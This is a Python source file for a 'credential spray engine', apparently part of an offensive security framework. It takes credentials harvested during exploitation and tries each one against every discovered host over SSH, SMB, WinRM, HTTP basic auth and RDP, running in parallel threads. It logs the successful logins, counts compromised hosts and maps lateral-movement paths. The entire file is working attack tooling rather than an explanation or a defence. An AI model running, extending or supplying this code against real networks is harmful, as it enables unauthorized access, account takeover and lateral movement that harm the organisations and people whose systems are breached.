"""
Expedite Strike Credential Spray Engine
================================
Harvests credentials from exploitation phase and systematically sprays
them across all discovered hosts on SSH, SMB, WinRM, RDP, and HTTP.
Builds a credential reuse graph for lateral movement mapping.

MITRE ATT&CK: T1110.003 (Password Spraying), T1078 (Valid Accounts)
"""

import os
import time
import socket
import threading
from typing import Callable, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

_log_fn = None


def _log(msg):
    if _log_fn:
        _log_fn(msg)


class CredentialPool:
    """Deduplicated credential store with source tracking."""

    def __init__(self):
        self._creds = {}  # (user, pass) -> {source_host, source_service, hash}
        self._lock = threading.Lock()

    def add(self, username: str, password: str, source_host: str = "",
            source_service: str = "", hash_value: str = ""):
        key = (username.lower().strip(), password)
        with self._lock:
            if key not in self._creds:
                self._creds[key] = {
                    "username": username,
                    "password": password,
                    "source_host": source_host,
                    "source_service": source_service,
                    "hash": hash_value,
                }
        return self

    def add_from_findings(self, findings: list):
        """Extract creds from exploit/findings data."""
        for f in findings:
            user = f.get("username", "") or f.get("user", "")
            pw = f.get("password", "") or f.get("pass", "")
            host = f.get("host", "") or f.get("target", "")
            svc = f.get("service", "") or f.get("scanner", "")
            if user and pw:
                self.add(user, pw, host, svc)

    @property
    def credentials(self):
        with self._lock:
            return list(self._creds.values())

    @property
    def count(self):
        with self._lock:
            return len(self._creds)

    def __repr__(self):
        return f"CredentialPool({self.count} credentials)"


# ── Spray Functions ──────────────────────────────────────────────────

def spray_ssh(ip: str, port: int, creds: list, log_fn: Callable = None) -> list:
    """Try all credentials via SSH (paramiko)."""
    successes = []
    try:
        import paramiko
    except ImportError:
        return successes

    for cred in creds:
        if cred.get("source_host") == ip:
            continue
        user, pw = cred["username"], cred["password"]
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=user, password=pw,
                           timeout=5, allow_agent=False, look_for_keys=False,
                           banner_timeout=5, auth_timeout=5)
            client.close()
            successes.append({
                "host": ip, "port": port, "service": "SSH",
                "username": user, "password": pw,
                "source_host": cred.get("source_host", ""),
            })
            if log_fn:
                log_fn(f"  [SPRAY] \u2705 SSH {user}@{ip}:{port} — credential reuse!")
        except Exception:
            pass
        time.sleep(0.3)
    return successes


def spray_smb(ip: str, port: int, creds: list, log_fn: Callable = None) -> list:
    """Try credentials via SMB (impacket)."""
    successes = []
    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        return successes

    for cred in creds:
        if cred.get("source_host") == ip:
            continue
        user, pw = cred["username"], cred["password"]
        try:
            conn = SMBConnection(ip, ip, sess_port=port, timeout=5)
            conn.login(user, pw)
            conn.logoff()
            successes.append({
                "host": ip, "port": port, "service": "SMB",
                "username": user, "password": pw,
                "source_host": cred.get("source_host", ""),
            })
            if log_fn:
                log_fn(f"  [SPRAY] \u2705 SMB {user}@{ip}:{port} — credential reuse!")
        except Exception:
            pass
        time.sleep(0.3)
    return successes


def spray_winrm(ip: str, port: int, creds: list, log_fn: Callable = None) -> list:
    """Try credentials via WinRM."""
    successes = []
    try:
        import winrm
    except ImportError:
        return successes

    for cred in creds:
        if cred.get("source_host") == ip:
            continue
        user, pw = cred["username"], cred["password"]
        try:
            session = winrm.Session(
                f"http://{ip}:{port}/wsman",
                auth=(user, pw),
                transport="ntlm",
                server_cert_validation="ignore",
                read_timeout_sec=5,
                operation_timeout_sec=5,
            )
            result = session.run_cmd("whoami")
            if result.status_code == 0:
                successes.append({
                    "host": ip, "port": port, "service": "WinRM",
                    "username": user, "password": pw,
                    "source_host": cred.get("source_host", ""),
                    "proof": result.std_out.decode().strip(),
                })
                if log_fn:
                    log_fn(f"  [SPRAY] \u2705 WinRM {user}@{ip}:{port} — credential reuse!")
        except Exception:
            pass
        time.sleep(0.3)
    return successes


def spray_rdp(ip: str, port: int, creds: list, log_fn: Callable = None) -> list:
    """Check RDP availability (port check + log attempts)."""
    successes = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result != 0:
            return successes
    except Exception:
        return successes

    for cred in creds:
        if cred.get("source_host") == ip:
            continue
        successes.append({
            "host": ip, "port": port, "service": "RDP",
            "username": cred["username"], "password": cred["password"],
            "source_host": cred.get("source_host", ""),
            "status": "port_open_cred_untested",
        })
    if successes and log_fn:
        log_fn(f"  [SPRAY] \u26a0 RDP {ip}:{port} open — {len(creds)} creds queued")
    return successes


def spray_http_basic(ip: str, port: int, creds: list, log_fn: Callable = None) -> list:
    """Try HTTP basic auth."""
    successes = []
    import urllib.request
    import base64

    for cred in creds:
        if cred.get("source_host") == ip:
            continue
        user, pw = cred["username"], cred["password"]
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{ip}:{port}/"
        try:
            auth_str = base64.b64encode(f"{user}:{pw}".encode()).decode()
            req = urllib.request.Request(url)
            req.add_header("Authorization", f"Basic {auth_str}")
            resp = urllib.request.urlopen(req, timeout=5)
            if resp.getcode() in (200, 301, 302):
                successes.append({
                    "host": ip, "port": port, "service": "HTTP",
                    "username": user, "password": pw,
                    "source_host": cred.get("source_host", ""),
                })
                if log_fn:
                    log_fn(f"  [SPRAY] \u2705 HTTP {user}@{ip}:{port} — credential reuse!")
        except Exception:
            pass
        time.sleep(0.2)
    return successes


# ── Main Orchestrator ────────────────────────────────────────────────

def _spray_host(ip: str, ports: list, creds: list, log_fn: Callable = None):
    """Spray all services on a single host."""
    results = []
    port_set = set(ports)

    ssh_ports = port_set & {22, 2222}
    for p in ssh_ports:
        results.extend(spray_ssh(ip, p, creds, log_fn))

    smb_ports = port_set & {445, 139}
    for p in smb_ports:
        results.extend(spray_smb(ip, p, creds, log_fn))

    winrm_ports = port_set & {5985, 5986}
    for p in winrm_ports:
        results.extend(spray_winrm(ip, p, creds, log_fn))

    rdp_ports = port_set & {3389}
    for p in rdp_ports:
        results.extend(spray_rdp(ip, p, creds, log_fn))

    http_ports = port_set & {80, 443, 8080, 8443, 8000, 8888}
    for p in http_ports:
        results.extend(spray_http_basic(ip, p, creds, log_fn))

    return results


def run_credential_spray(hosts: list, cred_pool: CredentialPool,
                         log_fn: Callable = None) -> dict:
    """
    Orchestrate credential spraying across all discovered hosts.

    Args:
        hosts: list of {"ip": str, "ports": list[int]}
        cred_pool: CredentialPool with harvested credentials
        log_fn: logging callback

    Returns:
        {
            "successful_logins": [...],
            "lateral_paths": [...],
            "stats": {"total_attempts", "successful", "hosts_compromised"}
        }
    """
    global _log_fn
    _log_fn = log_fn

    creds = cred_pool.credentials
    if not creds:
        _log("  [SPRAY] No credentials in pool — skipping credential spray")
        _log_fn = None
        return {"successful_logins": [], "lateral_paths": [], "stats": {
            "total_attempts": 0, "successful": 0, "hosts_compromised": 0}}

    _log(f"  [SPRAY] \ud83d\udd11 Credential spray starting: {len(creds)} creds \u00d7 {len(hosts)} hosts")
    for c in creds[:5]:
        _log(f"    \u2192 {c['username']}:{'*' * min(len(c['password']), 8)} (from {c.get('source_host', '?')})")

    all_logins = []
    lateral_paths = []
    compromised_hosts = set()

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {}
        for h in hosts:
            ip = h.get("ip", "")
            ports = h.get("ports", [])
            if not ip or not ports:
                continue
            future = executor.submit(_spray_host, ip, ports, creds, log_fn)
            futures[future] = ip

        for future in as_completed(futures):
            ip = futures[future]
            try:
                results = future.result(timeout=120)
                for r in results:
                    all_logins.append(r)
                    compromised_hosts.add(ip)
                    if r.get("source_host") and r["source_host"] != ip:
                        lateral_paths.append({
                            "source": r["source_host"],
                            "target": ip,
                            "method": f"cred_reuse_{r['service']}",
                            "credential": f"{r['username']}:{r['password'][:3]}***",
                        })
            except Exception as e:
                _log(f"  [SPRAY] Error on {ip}: {e}")

    _log(f"  [SPRAY] \ud83d\udcca Results: {len(all_logins)} successful logins, "
         f"{len(compromised_hosts)} hosts compromised, {len(lateral_paths)} lateral paths")

    _log_fn = None
    return {
        "successful_logins": all_logins,
        "lateral_paths": lateral_paths,
        "stats": {
            "total_attempts": len(creds) * len(hosts),
            "successful": len(all_logins),
            "hosts_compromised": len(compromised_hosts),
        },
    }
